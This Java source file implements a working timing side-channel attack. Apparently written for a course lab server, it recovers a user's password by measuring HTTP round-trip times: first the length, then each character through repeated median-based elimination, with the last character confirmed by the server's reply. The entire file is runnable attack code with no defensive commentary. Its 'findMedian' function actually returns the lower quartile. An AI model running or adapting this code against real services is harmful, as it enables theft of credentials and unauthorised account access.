import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.function.Consumer;

public class TimingAttack {
    private static final String PASSWORD_CORRECT = "1";
    private static final String PASSWORD_INCORRECT = "0";
    private static final String urlFmt = "http://aoi.ise.bgu.ac.il/?user=%s&password=%s";

    public static long numOfRequests = 0;

    public static String findPassword(String user) throws Exception {
        long startTime = System.nanoTime();
        // region configuration
        String dummyPass = "Jojo";
        int MAX_PASS_SIZE = 32;
        int NB_DUMMY_REQUESTS = 16;
        int NB_LENGTH_GUESSING_REPEATS = 10;
        int NB_CHAR_GUESSING_REPEATS = 1;

        String POSSIBLE_PASSWORD_CHARACTERS = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789";
        String confFormat =
                "__Configuration:____\n" +
                "user:\t\t\t\t\t\t\t%s\n" +
                "dummyPass:\t\t\t\t\t\t%s\n" +
                "MAX_PASS_SIZE:\t\t\t\t\t%d\n" +
                "NB_DUMMY_REQUESTS:\t\t\t\t%d\n" +
                "NB_LENGTH_GUESSING_REPEATS:\t\t%d\n" +
                "NB_CHAR_GUESSING_REPEATS:\t\t%d\n" +
                "POSSIBLE_PASSWORD_CHARACTERS:\t%s\n" +
                "____________________\n";
        // endregion

//        System.out.println(String.format(
//                confFormat,
//                user,
//                dummyPass,
//                MAX_PASS_SIZE,
//                NB_DUMMY_REQUESTS,
//                NB_LENGTH_GUESSING_REPEATS,
//                NB_CHAR_GUESSING_REPEATS,
//                POSSIBLE_PASSWORD_CHARACTERS
//        ));

//        System.out.print("sending a wakeup-call");
        sendDummyRequests(user, dummyPass, NB_DUMMY_REQUESTS);

//        System.out.print("\rfinding password length...");
        int passLength = findPasswordLength(user, MAX_PASS_SIZE, NB_LENGTH_GUESSING_REPEATS);
//        System.out.print(String.format("\rPwd Length: %d. ", passLength));

//        System.out.print("finding password characters...");
        String pwd = findPasswordChars(user, passLength, NB_CHAR_GUESSING_REPEATS, POSSIBLE_PASSWORD_CHARACTERS.toCharArray());
//        System.out.println(String.format("\rPassword: %s", pwd));

        long endTime = System.nanoTime();
//        System.out.println(String.format("Total running time: %d seconds", (long) (nanoToMilli(endTime - startTime) / 1000)));

        return pwd;
    }

    private static String getQueryURL(String username, String pwd) {
        return String.format(urlFmt, username, pwd);
    }

    public static String httpGet(String url, long[] nanoTimePlaceholder) throws Exception {
        numOfRequests++;

        URL obj = new URL(url);
        String inputLine;
        StringBuilder response = new StringBuilder();

        long startTime = System.nanoTime();
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        while ((inputLine = in.readLine()) != null) response.append(inputLine);
        in.close();
        long endTime = System.nanoTime();

        if (nanoTimePlaceholder != null && nanoTimePlaceholder.length == 1)
            nanoTimePlaceholder[0] = endTime - startTime;

        return response.toString();
    }

    public static String httpGet(String url) throws Exception {
        return httpGet(url, null);
    }

    public static long measureRTT(String user, String pass, int nbRepeats) throws Exception {
        long accumulatedTime = 0;
        long[] placeholder = new long[1];

        for (int i = 0; i < nbRepeats; i++) {
            httpGet(getQueryURL(user, pass), placeholder);
            accumulatedTime += placeholder[0];
        }
        return accumulatedTime / nbRepeats;
    }

    public static boolean guessPassAndUser(String user, String pass) throws Exception {
        String response = httpGet(getQueryURL(user, pass));
        if (response.equals(PASSWORD_CORRECT)) return true;
        else if (response.equals(PASSWORD_INCORRECT)) return false;
        else throw new Exception(String.format("Unknown response: %s", response));
    }


    private static String createPadding(int size) {
        StringBuilder padding = new StringBuilder();
        for (int i = 0; i < size; i++) padding.append(".");
        return padding.toString();
    }

    private static void sendDummyRequests(String username, String dummyPass, int num_of_requests) throws Exception {
        measureRTT(username, dummyPass, num_of_requests);
    }

    private static int findPasswordLength(String username, int maxPassSize, int numberOfRepeats) throws Exception {
        long currentRTT, maxRTT = 0;
        int passLengthWithMaxTime = 0;
        StringBuilder pwdBuilder = new StringBuilder("a");

        for (int currentPassLength = 1; currentPassLength <= maxPassSize; currentPassLength++) {
            currentRTT = measureRTT(username, pwdBuilder.toString(), numberOfRepeats);
            if (currentRTT > maxRTT) {
                maxRTT = currentRTT;
                passLengthWithMaxTime = currentPassLength;
            }
            pwdBuilder.append("a");
        }
        return passLengthWithMaxTime;
    }

    private static String findPasswordChars(String username, int passLength, int nbRepeats, char[] possibleChars) throws Exception {
        StringBuilder knownPrefix = new StringBuilder();
        char correctChar;
        for (int currentPrefixLength = 1; currentPrefixLength < passLength; currentPrefixLength++) {
            correctChar = binarySearchCorrectCharByRTT(username, nbRepeats, possibleChars, knownPrefix.toString(), createPadding(passLength - currentPrefixLength));
            knownPrefix.append(correctChar);
//            System.out.println(correctChar);
        }
        knownPrefix.append(findCorrectCharByServerResponse(username, possibleChars, knownPrefix.toString()));
        return knownPrefix.toString();
    }

    private static char findCorrectCharByServerResponse(String username, char[] possibleChars, String knownPwdPrefix) throws Exception {
        for (char c : possibleChars)
            if (guessPassAndUser(username, knownPwdPrefix + c))
                return c;

        throw new Exception(String.format("Correct character couldn't be found for username %s and password prefix %s", username, knownPwdPrefix));
    }

    private static char findCorrectCharByRTT(String username, int nbRepeats, char[] possibleChars, String knownPrefix, String padding, Consumer<Integer> progressReporter) throws Exception {
        long currentRTT, maxRTT = 0;
        char correctChar = '?';

        String currentPwd;
        int i = 1;
        for (char c : possibleChars) {
            if (progressReporter != null) progressReporter.accept(i);
            i++;

            currentPwd = knownPrefix + c + padding;
            currentRTT = measureRTT(username, currentPwd, nbRepeats);
            //System.out.println(currentRTT);
            if (currentRTT > maxRTT) {
                maxRTT = currentRTT;
                correctChar = c;
            }
        }
        return correctChar;
    }

    private static char binarySearchCorrectCharByRTT(String username, int nbRepeats, char[] possibleChars, String knownPrefix, String padding) {
        Hashtable<Character, Long> RTTsMap = new Hashtable<>();
        for (char c : possibleChars) {
            RTTsMap.put(c, 0L);
        }

        while (RTTsMap.size() > 1) {
            // measure RTT and update
            RTTsMap.forEach((currentChar, someRTT) -> {
                String currentPwd = knownPrefix + currentChar + padding;
                RTTsMap.compute(currentChar, (c, rtt) -> {
                    try {
                        return rtt + measureRTT(username, currentPwd, nbRepeats);
                    } catch (Exception e) {
                        return null;
                    }
                });
            });

            // remove
            double median = findMedian(RTTsMap.values());
            List<Character> charsToRemove = new LinkedList<>();
            RTTsMap.forEach((c, rtt) -> { if (rtt <= median) charsToRemove.add(c); });
            charsToRemove.forEach(RTTsMap::remove);
        }

        // RTTsMap should have 1 key left
        return RTTsMap.keys().nextElement();
    }

    private static double findMedian(Collection<Long> longs) {
        Long[] numArray = new Long[longs.size()];
        longs.toArray(numArray);

        Arrays.sort(numArray);
        double median;
//        if (numArray.length % 2 == 0)
//            median = ((double)numArray[numArray.length/2] + (double)numArray[numArray.length/2 - 1])/2;
//        else
//            median = (double) numArray[numArray.length/2];
        median = (double) numArray[numArray.length / 4];
        return median;
    }

    public static long nanoToMilli(long nano) {
        return (long) (nano / Math.pow(10, 6));
    }
}
